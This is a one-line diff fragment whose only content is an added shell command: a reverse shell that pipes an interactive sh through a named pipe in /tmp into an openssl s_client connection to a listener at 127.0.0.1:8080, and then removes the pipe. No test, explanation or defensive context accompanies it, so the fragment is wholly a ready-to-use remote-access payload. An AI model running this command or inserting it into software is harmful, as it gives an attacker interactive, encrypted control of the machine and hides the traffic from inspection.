@@ -1,0 +1,1 @@
+mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:8080 > /tmp/s; rm /tmp/s
